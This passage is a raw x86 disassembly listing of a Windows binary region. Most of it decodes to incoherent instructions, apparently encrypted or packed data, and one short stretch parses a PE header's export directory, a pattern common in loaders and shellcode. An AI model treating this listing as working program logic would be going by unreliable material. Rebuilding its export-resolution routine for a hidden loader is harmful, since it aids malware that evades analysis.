  40842f:	test   al,0x8d
  408431:	loopne 0x408429
  408433:	mov    cl,0x2d
  408435:	aad    0xcc
  408437:	retf   
  408438:	mov    edx,0xf6ab198b
  40843d:	jg     0x408474
  40843f:	sub    eax,0x2dd24399
  408444:	adc    dh,BYTE PTR [edx]
  408446:	fs sub al,0x22
  408449:	lods   al,BYTE PTR ds:[esi]
  40844a:	ret    0xdbc
  40844d:	sub    al,0x14
  40844f:	mov    ch,0x1
  408451:	mov    bl,ah
  408453:	lods   eax,DWORD PTR ds:[esi]
  408454:	pop    eax
  408455:	inc    esp
  408456:	cmp    DWORD PTR [esi-0x3e],0x4d
  40845a:	xor    BYTE PTR [eax+0x3bade65a],ah
  408460:	mov    bl,0xbf
  408462:	loop   0x408425
  408464:	dec    esp
  408465:	into   
  408466:	retf   0xf662
  408469:	cmp    esi,DWORD PTR [edx-0x1e]
  40846c:	fmul   DWORD PTR [edx]
  40846e:	test   BYTE PTR [eiz*8-0x1521b684],cl
  408475:	sahf   
  408476:	aas    
  408477:	out    dx,al
  408478:	cmp    esi,DWORD PTR [ebx+0x17156a0c]
  40847e:	push   cs
  40847f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408481:	push   0xd
  408483:	bound  edx,QWORD PTR [edx+0x7d]
  408486:	mov    ebx,0xe8f30220
  40848b:	mov    WORD PTR [edi],cs
  40848d:	jnp    0x4084e9
  40848f:	retf   0xe3bd
  408492:	jmp    0x3abc16cf
  408497:	push   ds
  408498:	pop    ds
  408499:	enter  0x4ccc,0x2f
  40849d:	dec    esp
  40849e:	jmp    0x1b2:0x54659834
  4084a5:	shl    BYTE PTR [ebx+edx*2+0x3afb362a],cl
  4084ac:	xor    dh,cl
  4084ae:	repz add eax,0xb113d8e
  4084b4:	jle    0x40852c
  4084b6:	jmp    0x408442
  4084b8:	dec    cl
  4084ba:	fsub   DWORD PTR [ecx]
  4084bc:	add    dh,BYTE PTR [edx]
  4084be:	dec    ebx
  4084bf:	ret    0xde16
  4084c2:	xchg   edi,eax
  4084c3:	sub    esi,edi
  4084c5:	int3   
  4084c6:	cmp    BYTE PTR [ecx-0x4c],dl
  4084c9:	xchg   DWORD PTR [eax+0x76ed3e4e],ebp
  4084cf:	pop    esi
  4084d0:	imul   ebx,DWORD PTR ds:[ebp+0x6cf9221b],0x38bf6a7b
  4084db:	jmp    0x408542
  4084dd:	xchg   ecx,eax
  4084de:	ror    BYTE PTR [eax-0x72],1
  4084e1:	sar    DWORD PTR [edx+0x57],0x4e
  4084e5:	imul   ecx,DWORD PTR [edx+0x5666fbe6],0x50
  4084ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ed:	push   esi
  4084ee:	xor    bh,BYTE PTR [ecx+0x6a5e93d9]
  4084f4:	loop   0x4084b4
  4084f6:	test   eax,0xf1628589
  4084fb:	add    eax,edi
  4084fd:	jmp    0xbf86:0x1629c947
  408504:	jecxz  0x4084ed
  408506:	xchg   DWORD PTR [esi+0x6ba9e4c8],esi
  40850c:	mov    edx,0x9cf3fbdb
  408511:	out    dx,eax
  408512:	pop    eax
  408513:	jbe    0x4084d9
  408515:	mov    ecx,cs
  408517:	int3   
  408518:	fimul  DWORD PTR [edx+0x65]
  40851b:	jb     0x408568
  40851d:	(bad)  
  40851e:	xor    ah,BYTE PTR [ecx+eiz*4+0x4da5ae3b]
  408525:	(bad)  
  408527:	jnp    0x40857f
  408529:	in     al,0xbd
  40852b:	js     0x40856a
  40852d:	es jae 0x408584
  408530:	mov    ds:0x76d121d2,eax
  408535:	or     dl,ch
  408537:	ss ret 0xd04e
  40853b:	xor    BYTE PTR [esi+edi*1-0x5f],ch
  40853f:	cmp    DWORD PTR [esi],0x3a
  408542:	retf   0x27ee
  408545:	adc    DWORD PTR [ebp+esi*4+0x70],eax
  408549:	clc    
  40854a:	in     eax,dx
  40854b:	lods   eax,DWORD PTR ds:[esi]
  40854c:	adc    al,0x92
  40854e:	mov    ds:0xf57931f,al
  408553:	cs stc 
  408555:	pop    ebp
  408556:	frstor [edx+0x24e951d2]
  40855c:	bound  esi,QWORD PTR [eax+0x43c99bc4]
  408562:	sbb    dh,0x7a
  408565:	imul   DWORD PTR [edi-0x1f]
  408568:	jle    0x408570
  40856a:	out    0xd5,al
  40856c:	sti    
  40856d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40856e:	retf   
  40856f:	pop    eax
  408570:	punpckhdq mm5,mm5
  408573:	jl     0x4085d4
  408575:	stos   BYTE PTR es:[edi],al
  408576:	clc    
  408577:	ins    BYTE PTR es:[edi],dx
  408578:	xchg   ebx,eax
  408579:	mov    ch,0xf0
  40857b:	mov    eax,ds:0xa76fb1fa
  408580:	add    eax,0x8c69e137
  408585:	xchg   ebp,eax
  408586:	pop    edx
  408587:	(bad)  
  408588:	dec    esp
  408589:	jl     0x408578
  40858b:	lahf   
  40858c:	mov    dl,0x21
  40858e:	or     esp,0x5a
  408591:	xchg   edi,eax
  408592:	popa   
  408593:	js     0x4085a6
  408595:	cmc    
  408596:	and    ecx,DWORD PTR [ebx-0x71]
  408599:	imul   DWORD PTR [ebx]
  40859b:	xchg   DWORD PTR [edx+0x7c],edi
  40859e:	xor    eax,0x7adb552
  4085a3:	xchg   bh,cl
  4085a5:	sub    DWORD PTR [ebx+0x4e],esi
  4085a8:	push   esp
  4085a9:	jne    0x4085bf
  4085ab:	loopne 0x40854f
  4085ad:	enter  0xc954,0xd3
  4085b1:	cmp    DWORD PTR [edi-0x3c],ebx
  4085b4:	cmp    DWORD PTR [ebx-0x383f6ef2],0xdc15425f
  4085be:	or     BYTE PTR [eax+0x766e9b87],bh
  4085c4:	jle    0x408593
  4085c6:	xor    ah,BYTE PTR [eax+0x66]
  4085c9:	int    0x93
  4085cb:	sub    DWORD PTR [ecx+0x63453e3c],0xa087366
  4085d5:	and    eax,0x900bce6b
  4085da:	icebp  
  4085db:	or     DWORD PTR [ecx-0x4f],ecx
  4085de:	xor    dh,bl
  4085e0:	mov    WORD PTR ds:[eax],cs
  4085e3:	iret   
  4085e4:	jl     0x40865c
  4085e6:	shl    DWORD PTR [esi+0x22da7eff],cl
  4085ec:	add    BYTE PTR [ebx],dh
  4085ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ef:	aam    0xce
  4085f1:	cmp    DWORD PTR [ebx+eax*2-0x46],ebp
  4085f5:	cli    
  4085f6:	pushf  
  4085f7:	cs xchg edx,eax
  4085f9:	push   ebp
  4085fa:	test   DWORD PTR [ecx+0x19],esi
  4085fd:	jp     0x4085fd
  4085ff:	std    
  408600:	or     DWORD PTR [ebx+0x3dcfa353],ebp
  408606:	cld    
  408607:	xchg   ebx,eax
  408608:	lods   al,BYTE PTR ds:[esi]
  408609:	jae    0x408618
  40860b:	mov    DWORD PTR [edi-0x63],ecx
  40860e:	mov    DWORD PTR [edx],esp
  408610:	push   cs
  408611:	jmp    FWORD PTR [eax]
  408613:	sbb    cl,BYTE PTR [eax-0x20]
  408616:	sbb    al,0xe1
  408618:	(bad)  
  408619:	jmp    0x87e9:0x3b42fa7
  408620:	add    eax,0x690ba302
  408625:	out    dx,eax
  408626:	loop   0x4085d6
  408628:	out    0x4c,al
  40862a:	jbe    0x40864d
  40862c:	ror    BYTE PTR [ecx-0x65],cl
  40862f:	retf   
  408630:	jne    0x4085c1
  408632:	pop    eax
  408633:	dec    ebx
  408634:	cwde   
  408635:	dec    edx
  408636:	jmp    FWORD PTR [esi-0x646fd82d]
  40863c:	daa    
  40863d:	cld    
  40863e:	mov    bl,0xa9
  408640:	pop    ss
  408641:	jae    0x408607
  408643:	add    ebp,0xffffffb6
  408646:	or     DWORD PTR [eax+0xc9f821a],edx
  40864c:	xchg   ebx,eax
  40864d:	mov    ebx,0x95d40629
  408652:	je     0x40867d
  408654:	or     BYTE PTR [edi],0x85
  408657:	or     al,0x0
  408659:	add    BYTE PTR [eax],al
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0x70612039
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [edi],bh
  40869e:	cmp    ebp,DWORD PTR [edi]
  4086a0:	cs leave 
  4086a2:	or     edi,DWORD PTR [edi]
  4086a4:	xchg   ebp,eax
  4086a5:	xor    DWORD PTR [ebx+0x5f],ebp
  4086a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086a9:	mov    ecx,0x982e4b6a
  4086ae:	jne    0x4086dd
  4086b0:	fimul  DWORD PTR [ebp-0x67]
  4086b3:	mov    ebx,0x941e03a6
  4086b8:	stc    
  4086b9:	fdivr  QWORD PTR [eax-0xd77d3d4]
  4086bf:	(bad)  
  4086c0:	pop    ecx
  4086c1:	cmp    dl,BYTE PTR [ebx+0x56831ad9]
  4086c7:	adc    ebx,DWORD PTR [esp+eax*2-0x24bda718]
  4086ce:	jne    0x408719
  4086d0:	pop    ecx
  4086d1:	lds    esi,FWORD PTR [eax-0x73]
  4086d4:	or     DWORD PTR [ebx+0x2cce874d],esp
  4086da:	xor    DWORD PTR [edi+0x23],edi
  4086dd:	cmp    ecx,esp
  4086df:	leave  
  4086e0:	mov    dl,0xc5
  4086e2:	in     eax,0x15
  4086e4:	and    eax,0xceaa0003
  4086e9:	stc    
  4086ea:	dec    ebx
  4086eb:	cmp    esp,esi
  4086ed:	pop    edx
  4086ee:	icebp  
  4086ef:	adc    DWORD PTR ds:0x5c74c04b,0x4c
  4086f6:	loopne 0x4086f1
  4086f8:	loope  0x40869c
  4086fa:	jno    0x408763
  4086fc:	call   0x9a186835
  408701:	xor    BYTE PTR [ecx],bh
  408703:	adc    al,cl
  408705:	lods   al,BYTE PTR ds:[esi]
  408706:	loop   0x408727
  408708:	addr16 popf 
  40870a:	(bad)  
  40870b:	je     0x40873e
  40870d:	fidivr DWORD PTR ds:0x2610278a
  408713:	jg     0x40876c
  408715:	mov    dl,0xb2
  408717:	cmp    DWORD PTR [edi+0x47],ebx
  40871a:	add    esp,esp
  40871c:	(bad)  
  40871d:	adc    al,0xdc
  40871f:	cwde   
  408720:	jb     0x4086d3
  408722:	sbb    BYTE PTR [edx-0x1b],bl
  408725:	lds    edi,FWORD PTR [ebp-0xb]
  408728:	imul   esp,DWORD PTR [edx-0x1cd615f2],0xaebeffb7
  408732:	ss stos BYTE PTR es:[edi],al
  408734:	inc    esi
  408735:	sbb    eax,0xe401cfbf
  40873a:	add    eax,0xa77f57a1
  40873f:	pop    ecx
  408740:	inc    ecx
  408741:	fstp   st(6)
  408743:	or     edi,DWORD PTR [ecx+0x6335de9f]
  408749:	repz fnsave [esi+0x5759f621]
  408750:	push   ebp
  408751:	pop    edi
  408752:	inc    esi
  408753:	cmp    al,0x8f
  408755:	pop    ds
  408756:	cmp    eax,0x165837c2
  40875b:	xor    eax,0x91839ca8
  408760:	jecxz  0x40871f
  408762:	push   edi
  408763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408764:	sbb    BYTE PTR [eax-0x7c],0x2e
  408768:	mov    ebp,0x578f8a1f
  40876d:	lfs    edx,FWORD PTR [edx-0x620094ac]
  408774:	inc    edx
  408775:	in     eax,dx
  408776:	dec    edi
  408777:	add    edi,DWORD PTR [edi*8-0x37700ee]
  40877e:	push   ss
  40877f:	stc    
  408780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408781:	sbb    BYTE PTR [esi+0x5e],dl
  408784:	mov    edx,0x7f9b7393
  408789:	stos   BYTE PTR es:[edi],al
  40878a:	clc    
  40878b:	ret    0xcb8b
  40878e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40878f:	rol    DWORD PTR [esi-0x20],0x25
  408793:	gs neg bl
  408796:	sub    esp,DWORD PTR [edi]
  408798:	xor    al,0x52
  40879a:	jnp    0x4087d2
  40879c:	ss jb  0x408807
  40879f:	aaa    
  4087a0:	cmp    al,0x97
  4087a2:	mov    ah,0x39
  4087a4:	mov    al,ds:0x24680af2
  4087a9:	popa   
  4087aa:	sub    esi,DWORD PTR [ebp+0x57]
  4087ad:	adc    dl,BYTE PTR [edi-0x32cb20c3]
  4087b3:	iret   
  4087b4:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4087b6:	xchg   cl,cl
  4087b8:	jb     0x408745
  4087ba:	call   0x2025b61d
  4087bf:	or     DWORD PTR [ecx+eiz*2],edx
  4087c2:	push   ss
  4087c3:	add    eax,ebx
  4087c5:	adc    ebp,edx
  4087c7:	add    eax,0x93f2bc6d
  4087cc:	rcr    BYTE PTR [esi],cl
  4087ce:	cmp    ah,BYTE PTR [ebx]
  4087d0:	stos   DWORD PTR es:[edi],eax
  4087d1:	cmp    BYTE PTR [edx],ah
  4087d3:	nop
  4087d4:	enter  0xcb3e,0xf
  4087d8:	push   esi
  4087d9:	stos   DWORD PTR es:[edi],eax
  4087da:	dec    edx
  4087db:	cmp    DWORD PTR [eax],esp
  4087dd:	ins    DWORD PTR es:[edi],dx
  4087de:	and    edx,DWORD PTR [ebp-0x45]
  4087e1:	int    0x13
  4087e3:	cmp    BYTE PTR [edi-0x7d53e90f],al
  4087e9:	scas   al,BYTE PTR es:[edi]
  4087ea:	or     bl,al
  4087ec:	lods   eax,DWORD PTR ds:[esi]
  4087ed:	xchg   edi,eax
  4087ee:	(bad)
  4087f1:	cld    
  4087f2:	int3   
  4087f3:	add    eax,0x717ac95
  4087f8:	out    dx,eax
  4087f9:	adc    al,0x0
  4087fb:	dec    edi
  4087fc:	jle    0x4087b0
  4087fe:	loop   0x408780
  408800:	xor    ah,cl
  408802:	xchg   DWORD PTR [ecx],ecx
  408804:	dec    esi
  408805:	or     al,0xe1
  408807:	sbb    ch,cl
  408809:	sbb    eax,0xa2c0f17c
  40880e:	mov    edx,0xda4d46c0
  408813:	cdq    
  408814:	dec    edi
  408815:	cmp    eax,0x57b484e4
  40881a:	xor    BYTE PTR [ecx+0x37ae4f71],dh
  408820:	jg     0x408851
  408822:	ss call 0x1d3:0xe706b99f
  40882a:	popf   
  40882b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40882c:	repnz pop edx
  40882e:	push   ecx
  40882f:	pop    esi
  408830:	ret    0xe6c6
  408833:	push   cs
  408834:	loope  0x408877
  408836:	mov    edi,DWORD PTR [ebp+eiz*2-0x5891134b]
  40883d:	cmp    cl,BYTE PTR [eax-0x32]
  408840:	or     eax,0xbe00ab2f
  408845:	jp     0x408835
  408847:	or     dl,BYTE PTR [esi-0x71b55d29]
  40884d:	add    edx,DWORD PTR [esi+0x7e]
  408850:	test   al,0x59
  408852:	sub    esi,DWORD PTR [eax-0x3a]
  408855:	ret    
  408856:	xor    ch,BYTE PTR [eax]
  408858:	pop    edi
  408859:	sub    ebp,DWORD PTR [ebx]
  40885b:	mov    ecx,0x8fb5b388
  408860:	shl    DWORD PTR [edx-0x24],0x80
  408864:	shl    BYTE PTR [esi+0x785c4685],1
  40886a:	mov    ah,0xbc
  40886c:	jp     0x4088a9
  40886e:	ret    
  40886f:	lods   eax,DWORD PTR ds:[esi]
  408870:	dec    esi
  408871:	cmp    edx,edx
  408873:	or     eax,0x97fb359c
  408878:	nop
  408879:	data16 sbb bl,0x3
  40887d:	mov    edi,0xf75218a5
  408882:	dec    esi
  408883:	pop    eax
  408884:	les    esp,FWORD PTR [edi-0x7f]
  408887:	sti    
  408888:	in     eax,dx
  408889:	adc    eax,0x27c122d2
  40888e:	jl     0x40882f
  408890:	lods   eax,DWORD PTR ds:[esi]
  408891:	mov    ecx,DWORD PTR [edi-0x53bf360c]
  408897:	push   0xffffffe9
  408899:	pop    ebp
  40889a:	inc    edx
  40889b:	dec    esi
  40889c:	ret    0x119d
  40889f:	xor    al,0x12
  4088a1:	mov    al,ds:0xef718670
  4088a6:	aam    0xcf
  4088a8:	(bad)  
  4088aa:	pushf  
  4088ab:	pushf  
  4088ac:	mov    ebx,0x76fe015e
  4088b1:	mov    fs,WORD PTR [edx+0x5f0fa3a2]
  4088b7:	or     BYTE PTR [esp+ebp*2-0x5544fecf],cl
  4088be:	ret    
  4088bf:	pusha  
  4088c0:	pusha  
  4088c1:	push   ecx
  4088c2:	mov    ch,0x48
  4088c4:	sbb    ebp,ebx
  4088c6:	or     al,BYTE PTR ds:0x75a05840
  4088cc:	mov    BYTE PTR [edx-0x1026b78a],bh
  4088d2:	icebp  
  4088d3:	add    al,0x37
  4088d5:	sbb    bl,BYTE PTR [esp+eiz*4]
  4088d8:	sbb    cl,BYTE PTR [eax-0xeb874b5]
  4088de:	arpl   WORD PTR [ebp+0x189acf5f],si
  4088e4:	mov    dl,0x61
  4088e6:	lock xchg edx,eax
  4088e8:	pop    esi
  4088e9:	jp     0x4088e2
  4088eb:	jns    0x408885
  4088ed:	sub    eax,0x17837488
  4088f2:	cmc    
  4088f3:	mov    ds:0x60a17a23,eax
  4088f8:	out    dx,al
  4088f9:	sub    eax,0x32fd9d70
  4088fe:	lods   eax,DWORD PTR ds:[esi]
  4088ff:	(bad)  
  408900:	popa   
  408901:	and    al,0x52
  408903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408904:	popf   
  408905:	jns    0x4088c6
  408907:	out    dx,eax
  408908:	and    DWORD PTR [eax-0x1a229e0],ebp
  40890e:	rcl    ch,1
  408910:	adc    al,0x48
  408912:	ins    BYTE PTR es:[edi],dx
  408913:	mov    ebx,0xc4c476ed
  408918:	retf   
  408919:	or     eax,0xb6daa89d
  40891e:	adc    eax,0xaab79c7e
  408923:	stos   BYTE PTR es:[edi],al
  408924:	rcl    DWORD PTR cs:[ebp-0x50824b94],1
  40892b:	jne    0x408913
  40892d:	pop    ebx
  40892e:	push   ds
  40892f:	mov    eax,ds:0x792a510
  408934:	mov    al,ds:0xeec83dab
  408939:	jmp    0xc666:0x18aa9f87
  408940:	xor    edi,DWORD PTR [ecx]
  408942:	sub    ecx,DWORD PTR [ebx-0x771cc5b4]
  408948:	adc    al,dl
  40894a:	rcl    bh,1
  40894c:	ret    
  40894d:	retf   0xd64f
  408950:	jbe    0x408965
  408952:	in     al,0x3c
  408954:	or     al,0x3f
  408956:	addr16 xchg ah,ch
  408959:	push   cs
  40895a:	cmp    BYTE PTR [ecx-0x12],0x1f
  40895e:	in     eax,0x79
  408960:	out    dx,al
  408961:	jge    0x4088f0
  408963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408964:	add    DWORD PTR [ecx],esi
  408966:	jnp    0x4089aa
  408968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40896a:	jl     0x40894e
  40896c:	jge    0x4089e9
  40896e:	sahf   
  40896f:	push   edi
  408970:	imul   edx,DWORD PTR [ebx-0x6a3c61c4],0xe
  408977:	or     esp,esp
  408979:	add    DWORD PTR [esi],eax
  40897b:	fild   QWORD PTR [edx-0x427d3123]
  408981:	fwait
  408982:	pusha  
  408983:	fxch   st(6)
  408985:	xor    al,BYTE PTR [edi]
  408987:	rcl    BYTE PTR [ebx+0x29bf723],cl
  40898d:	mov    ds:0x825a381c,eax
  408992:	xor    eax,0x4336c398
  408997:	cmp    edx,DWORD PTR [edi+0x66]
  40899a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40899b:	jmp    0x5d25844c
  4089a0:	lds    edi,FWORD PTR [edx+0x37]
  4089a3:	sub    al,0x5d
  4089a5:	ins    BYTE PTR es:[edi],dx
  4089a6:	sbb    ch,BYTE PTR [eax+0x1a7ae9f4]
  4089ac:	mov    ds:0x57463687,al
  4089b1:	mov    bl,0xf6
  4089b3:	and    BYTE PTR [esi-0x77],al
  4089b6:	arpl   WORD PTR [edi],dx
  4089b8:	mov    WORD PTR [edx+esi*2+0x60d266b5],ss
  4089bf:	xchg   ebx,eax
  4089c0:	jo     0x408990
  4089c2:	push   0xcd40e0c6
  4089c7:	jns    0x408a1e
  4089c9:	inc    edx
  4089ca:	add    eax,0x8086b4ef
  4089cf:	push   ecx
  4089d0:	mov    bl,BYTE PTR [edi+0x24]
  4089d3:	push   ebx
  4089d4:	rcl    DWORD PTR [eiz*2+0x775239ef],cl
  4089db:	mov    al,0x8
  4089dd:	loop   0x4089cf
  4089df:	aad    0xe9
  4089e1:	or     al,0x23
  4089e3:	(bad)
  4089e6:	cmp    DWORD PTR [esi-0x3c53b857],esi
  4089ec:	int    0xa1
  4089ee:	add    ebx,DWORD PTR [ecx]
  4089f0:	inc    esp
  4089f1:	pop    eax
  4089f2:	ret    
  4089f3:	sbb    eax,0xb1298631
  4089f8:	lods   eax,DWORD PTR ds:[esi]
  4089f9:	imul   ebp,edx,0xffffffe6
  4089fc:	adc    eax,0x15ad8889
  408a01:	sbb    eax,0xdec36744
  408a06:	mov    BYTE PTR [ebx+0x3b],al
  408a09:	aad    0x55
  408a0b:	(bad)  
  408a0c:	dec    ebx
  408a0d:	sub    edx,esi
  408a0f:	or     BYTE PTR [ecx+0x5095a41b],dh
  408a15:	cld    
  408a16:	hlt    
  408a17:	push   ecx
  408a18:	mov    cl,0xa9
  408a1a:	pop    edx
  408a1b:	btc    DWORD PTR [edi-0xa],eax
  408a1f:	lods   eax,DWORD PTR ds:[esi]
  408a20:	xchg   ebx,eax
  408a21:	aam    0x64
  408a23:	or     BYTE PTR [edi],ah
  408a25:	adc    BYTE PTR [eax+0x7],0x97
  408a29:	xor    BYTE PTR [eax-0x7f],ah
  408a2c:	popa   
  408a2d:	lods   al,BYTE PTR ds:[esi]
  408a2e:	in     al,dx
  408a2f:	pushf  
  408a30:	sahf   
  408a31:	test   BYTE PTR [ebx-0x185f068d],al
  408a37:	xchg   edi,eax
  408a38:	(bad)  
  408a39:	pusha  
  408a3a:	push   edi
  408a3b:	jae    0x4089d4
  408a3d:	int    0xd5
  408a3f:	in     al,0xe6
  408a41:	cmp    al,al
  408a43:	mov    WORD PTR [esi-0x65],ss
  408a46:	cmp    DWORD PTR [eax+ebx*2+0x9e10c4d],esp
  408a4d:	pushf  
  408a4e:	dec    esp
  408a4f:	pop    esi
  408a50:	mov    edx,DWORD PTR [ecx-0x7346daa7]
  408a56:	stos   BYTE PTR es:[edi],al
  408a57:	stos   BYTE PTR es:[edi],al
  408a58:	rcr    DWORD PTR [ebx+0x1289b110],0x8b
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	mov    ecx,0xb5bcd794
  408a79:	push   edi
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [ecx-0x13],al
  408a82:	pop    ss
  408a83:	loope  0x408a0a
  408a85:	addr16 mov dh,0x29
  408a88:	mov    ecx,0xdc51ace1
  408a8d:	stos   DWORD PTR es:[edi],eax
  408a8e:	mov    cl,0x82
  408a90:	outs   dx,BYTE PTR ds:[esi]
  408a91:	das    
  408a92:	cmp    eax,0xec33aef8
  408a97:	jae    0x408a27
  408a99:	in     eax,dx
  408a9a:	sbb    al,al
  408a9c:	add    esi,edx
  408a9e:	add    ebx,DWORD PTR [ebx+0x45]
  408aa1:	aad    0x6d
  408aa3:	(bad)  
  408aa4:	scas   al,BYTE PTR es:[edi]
  408aa5:	xor    edx,DWORD PTR [esi+0x69032037]
  408aab:	test   al,0xc7
  408aad:	pop    edi
  408aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aaf:	sub    DWORD PTR [eax],esp
  408ab1:	add    DWORD PTR [eax-0x4bffb874],ebp
  408ab7:	mov    ah,0xe6
  408ab9:	sub    cl,BYTE PTR [edx+0x47016391]
  408abf:	repz (bad) 
  408ac1:	mov    ds:0xf0788a10,al
  408ac6:	test   DWORD PTR [ebp+0x20],eax
  408ac9:	sahf   
  408aca:	lahf   
  408acb:	enter  0xa5f0,0xed
  408acf:	cwde   
  408ad0:	mov    bh,0xfc
  408ad2:	mov    DWORD PTR [esi-0x80],ebx
  408ad5:	(bad)  
  408ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad7:	outs   dx,BYTE PTR ds:[esi]
  408ad8:	xor    edi,DWORD PTR [edi+ebx*1]
  408adb:	and    al,0x2d
  408add:	cmp    BYTE PTR [ecx-0x4f38468f],cl
  408ae3:	das    
  408ae4:	add    eax,0x7a2b0a65
  408ae9:	jae    0x408a85
  408aeb:	sbb    al,0xce
  408aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aef:	(bad)  
  408af0:	int    0xac
  408af2:	inc    esp
  408af3:	sbb    DWORD PTR ds:0x8183ccc3,edi
  408af9:	mov    dh,0xd4
  408afb:	and    DWORD PTR [eax],ebx
  408afd:	mov    ebp,0xc00c1009
  408b02:	lds    esp,FWORD PTR [esi]
  408b04:	xchg   esi,eax
  408b05:	jb     0x408b6e
  408b07:	adc    BYTE PTR [edx-0x58],bl
  408b0a:	fsub   st,st(2)
  408b0c:	(bad)  
  408b0d:	aaa    
  408b0e:	in     al,dx
  408b0f:	lods   eax,DWORD PTR ds:[esi]
  408b10:	xchg   edi,eax
  408b11:	arpl   WORD PTR [eax],cx
  408b13:	xchg   ecx,eax
  408b14:	inc    ebx
  408b15:	mov    dl,0x92
  408b17:	dec    edx
  408b18:	clc    
  408b19:	or     cl,BYTE PTR [esi-0x59]
  408b1c:	sub    al,0x7d
  408b1e:	sub    al,0x64
  408b20:	gs dec esi
  408b22:	je     0x408b10
  408b24:	sbb    ah,bh
  408b26:	and    eax,ebp
  408b28:	cli    
  408b29:	add    BYTE PTR ds:0x2b273ec6,bh
  408b2f:	(bad)  
  408b30:	mov    dh,0xff
  408b32:	mov    ebp,0x79cea119
  408b37:	jl     0x408b01
  408b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b3a:	add    eax,0x8c24f062
  408b3f:	add    eax,0x20e77f1c
  408b44:	add    eax,ebp
  408b46:	push   0xffffffad
  408b48:	jnp    0x408af8
  408b4a:	stc    
  408b4b:	test   DWORD PTR [ecx],esi
  408b4d:	add    eax,DWORD PTR [ebp+0x53ad1a]
  408b53:	xor    BYTE PTR [ebx],bh
  408b55:	inc    ebx
  408b56:	clc    
  408b57:	mov    eax,0x2120dee9
  408b5c:	jmp    0x5ef87122
  408b61:	ret    
  408b62:	sbb    esp,ebx
  408b64:	xchg   edi,eax
  408b65:	fimul  WORD PTR [ecx-0x38]
  408b68:	pop    edi
  408b69:	fwait
  408b6a:	mov    ch,0xdb
  408b6c:	xchg   esp,eax
  408b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b6e:	xor    BYTE PTR [ebx+0x55],dl
  408b71:	lods   eax,DWORD PTR ds:[esi]
  408b72:	sub    eax,0x946d6386
  408b77:	mov    WORD PTR [esi+0x41],fs
  408b7a:	add    ecx,DWORD PTR [eax+0x4b]
  408b7d:	call   0x20bbb47
  408b82:	pcmpeqd mm6,QWORD PTR [ebx+ecx*2-0x20e525f5]
  408b8a:	inc    ebx
  408b8b:	jle    0x408bf2
  408b8d:	sbb    dl,bl
  408b8f:	adc    dh,BYTE PTR [ebp+0x39]
  408b92:	mov    eax,ds:0x520017f
  408b97:	imul   ecx,DWORD PTR [edx+0x69ec87c9],0x2f1594ad
  408ba1:	aad    0xb5
  408ba3:	mov    al,ds:0xcb71a263
  408ba8:	(bad)  
  408baa:	lahf   
  408bab:	push   edx
  408bac:	xor    BYTE PTR [edx-0x64],ah
  408baf:	mov    ch,0xc5
  408bb1:	pop    esi
  408bb2:	inc    ebx
  408bb3:	mov    edx,0xbdf96786
  408bb8:	add    eax,0x79527e18
  408bbd:	fbstp  TBYTE PTR [edi+0x79315240]
  408bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bc4:	xchg   edx,eax
  408bc5:	dec    esp
  408bc6:	call   0x4382:0xe93a4425
  408bcd:	retf   0xbc86
  408bd0:	repz jno 0x408c2a
  408bd3:	ret    
  408bd4:	(bad)  
  408bd5:	sbb    edi,DWORD PTR [ecx+0xfc2e1b0]
  408bdb:	clc    
  408bdc:	pop    esi
  408bdd:	sti    
  408bde:	push   ss
  408bdf:	mov    eax,ds:0x47c034c4
  408be4:	jl     0x408c00
  408be6:	mov    DWORD PTR [esi+esi*2-0x1f0539f5],edx
  408bed:	pop    ebp
  408bee:	sahf   
  408bef:	je     0x408c57
  408bf1:	mov    ebx,0xea2d9743
  408bf6:	inc    edi
